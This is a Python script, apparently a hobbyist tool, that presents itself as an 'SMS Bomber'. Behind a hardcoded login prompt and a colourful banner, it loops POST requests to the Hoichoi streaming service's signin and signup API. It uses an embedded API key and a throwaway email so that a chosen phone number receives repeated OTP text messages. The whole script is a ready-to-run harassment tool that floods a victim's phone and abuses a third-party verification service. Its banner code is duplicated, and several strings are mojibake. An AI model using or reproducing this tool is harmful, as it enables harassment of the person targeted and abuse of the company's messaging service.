import requests as rq

blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
purple="\033[0;35m"


import os
os.system("clear")


line=red+"Note: I won't be responsible fo any damage caused by this script. Use at your own risk."
space=" "
print (green+"""
  _______ __  __   ____   ____  __  __ ____  ______ _____  
 |__   __|  \/  | |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
    | |  | \  / | | |_) | |  | | \  / | |_) | |__  | |__) |
    | |  | |\/| | |  _ <| |  | | |\/| |  _ <|  __| |  _  / 
    | |  | |  | | | |_) | |__| | |  | | |_) | |____| | \ \ 
    |_|  |_|  |_| |____/ \____/|_|  |_|____/|______|_|  \_\
            """)
            
text=lightblue+"\t\tğğ«ğğğ­ğğ ğğ²:"+yellow+"ğğ ğğğğğğ ğğğğğğ"+cyan+"\n\n\t\tââ "+purple+"TASRIF MULTIMEDIA"+cyan+"ââ   \n" 
notice=""     
def header():
 print(text)
 print(line)
 print(notice)

#SECURITY    
header()
print(red+"___________________________________________________________")
print("\t\tYour Must Log In first")
print("----------------------------------------------------------â-")
n=2
while n==2:
  a=str(input(cyan+"\n\n\t\t[>] Username : "+green))
  b=str(input(cyan+"\n\n\t\t[>] Password : "+green))
  if a=="TASRIF" and b=="MULTIMEDIA":
   print(green+"\n\n\t\t[ â ] Request Accepted")
   n=3
  else:
   
   print(red+"\n\n\t\t[ Ã ] Incorrect Password/Username!\n\t\tPlease Try Again")
   n=2
   
  
import requests as rq

import os
os.system("clear")

line=red+"Note: I won't be responsible fo any damage caused by this script. Use at your own risk."
space=" "

print (green+"""
  _______ __  __   ____   ____  __  __ ____  ______ _____  
 |__   __|  \/  | |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
    | |  | \  / | | |_) | |  | | \  / | |_) | |__  | |__) |
    | |  | |\/| | |  _ <| |  | | |\/| |  _ <|  __| |  _  / 
    | |  | |  | | | |_) | |__| | |  | | |_) | |____| | \ \ 
    |_|  |_|  |_| |____/ \____/|_|  |_|____/|______|_|  \_\
            """)
            
text=lightblue+"\t\tğğ«ğğğ­ğğ ğğ²:"+yellow+"ğğ ğğğğğğ ğğğğğğ"+cyan+"\n\n\t\tââ "+purple+"TASRIF MULTIMEDIA"+cyan+"ââ   \n" 
notice=""     
def header():
 print(text)
 print(line)
 print(notice)
 
header()

print ('	')



"""

SMS Bomber using Hoichoi SMS api
"""

def send(target):
  header = {
    "x-api-key": "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
  }

  data = {
    "requestType":"send",
    "phoneNumber":"+88"+target,
    "screenName":"signin"
  }

  url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-44067eab-5337-99d8-11eb-99ca1e4db186"
  res = rq.post(url, json=data, headers=header)
  if res.json().get("code"):
    data = {
      "requestType":"send",
      "phoneNumber":"+88"+target,
      "emailConsent":"true",
      "whatsappConsent":"true",
      "email":"cicas94417@iconmle.com"
    }
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"

    res = rq.post(url, json=data, headers=header)
    if not res.json().get("sent"): return False
  return True

def main():
  target = input(green+"â¢ Enter Target Number: ")
  amount = int(input(purple+"â¢ Enter Amount: "))
  sent, nsent = 0, amount
  for i in range(1, amount + 1):
    try:
      if send(target):
        print(f"â¢[{i}] SMS Sent â")
        sent += 1
        nsent -= 1
      else:
        print(f"â¢[{i}] SMS Not Sentâ")
    except KeyboardInterrupt: break
    except Exception as e: print(e); break
  print(f"\n[*] Total Target: {amount}\n[+] Sentâ: {sent}\n[-] Not Sent â: {nsent}")

if __name__ == "__main__":
  main()
